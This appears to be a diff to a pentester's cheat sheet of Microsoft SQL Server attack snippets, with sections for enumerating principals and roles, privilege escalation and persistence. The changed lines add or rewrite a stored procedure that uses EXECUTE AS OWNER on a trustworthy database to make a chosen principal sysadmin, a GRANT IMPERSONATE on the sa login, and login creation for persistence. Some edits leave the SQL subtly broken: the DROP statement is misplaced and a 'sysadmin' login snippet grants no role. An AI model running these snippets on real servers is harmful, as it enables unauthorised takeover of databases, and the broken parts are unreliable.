@@ -60,7 +60,7 @@ SELECT * FROM <databaseName>.<schemaName|dbo>.<tableName>
 
 ## enum - Get principals and their server-level roles
 ```sql
-SELECT r.name, r.type_desc, r.is_disabled, sl.sysadmin, sl.securityadmin, sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin, sl.dbcreator, sl.bulkadminFROM master.sys.server_principals r LEFT JOIN master.sys.syslogins sl ON sl.sid = r.sidWHERE r.type IN ('S','E','X','U','G');
+SELECT r.name, r.type_desc, r.is_disabled, sl.sysadmin, sl.securityadmin, sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin, sl.dbcreator, sl.bulkadmin FROM master.sys.server_principals r LEFT JOIN master.sys.syslogins sl ON sl.sid = r.sid WHERE r.type IN ('S','E','X','U','G');
 ```
 
 
@@ -68,7 +68,7 @@ SELECT r.name, r.type_desc, r.is_disabled, sl.sysadmin, sl.securityadmin, sl.ser
 will show NULL in case of insufficient privilge
 
 ```sql
-SELECT r.name AS role_principal_name, m.name AS member_principal_name FROM sys.database_role_members rm JOIN sys.database_principals r  ON rm.role_principal_id = r.principal_id JOIN sys.database_principals m ON rm.member_principal_id = m.principal_id
+use <db_name>; SELECT r.name AS role_principal_name, m.name AS member_principal_name FROM sys.database_role_members rm JOIN sys.database_principals r  ON rm.role_principal_id = r.principal_id JOIN sys.database_principals m ON rm.member_principal_id = m.principal_id
 ```
 
 ## enum - Get sysadmins
@@ -110,16 +110,17 @@ EXEC sp_addsrvrolemember '<user>', '<role|sysadmin>';
 ```
 
 ## privesc - grant server-level role (db_owner / Trustworthy DB)
-```sql
-CREATE PROCEDURE sp_privesc
-WITH EXECUTE AS OWNER
-AS
-	EXEC sp_addsrvrolemember 'ws_dev', 'sysadmin'
-GO
-
-EXECUTE sp_privesc;
 DROP PROCEDURE sp_privesc;
+```sql
+CREATE PROCEDURE sp_privesc WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember '<principal_name>', 'sysadmin' EXECUTE sp_privesc;
 ```
+
+
+## persist - grant IMPERSONATE
+```sql
+GRANT IMPERSONATE ON LOGIN::<login|sa> to [<user>]
+```
+
 
 ## persist - Create login with sysadmin privs
 ```sql
@@ -130,6 +131,12 @@ CREATE LOGIN jubeaz WITH PASSWORD = '<password|Jube@z123!';
 ```sql
 create login [<domain_netbios>\<user>] from windows;
 ```
+
+## persist - add domain login with sysadmin privs
+```sql
+create login [<domain_netbios>\<user>] from windows;
+```
+
 
 ## execute command
 ```sql
